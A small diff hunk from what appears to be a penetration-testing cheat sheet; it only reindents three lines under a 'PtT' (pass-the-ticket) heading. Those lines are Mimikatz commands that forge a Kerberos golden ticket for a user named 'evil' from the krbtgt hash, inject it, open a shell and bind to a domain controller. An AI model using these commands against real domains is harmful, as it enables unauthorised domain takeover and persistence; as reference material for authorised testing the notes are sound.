@@ -115,6 +115,6 @@ PtH
 
 PtT
 ---
-   kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ptt
-   misc::cmd
-   klist add_bind lpt.com server2019.lpt.com 
+    kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ptt
+    misc::cmd
+    klist add_bind lpt.com server2019.lpt.com 
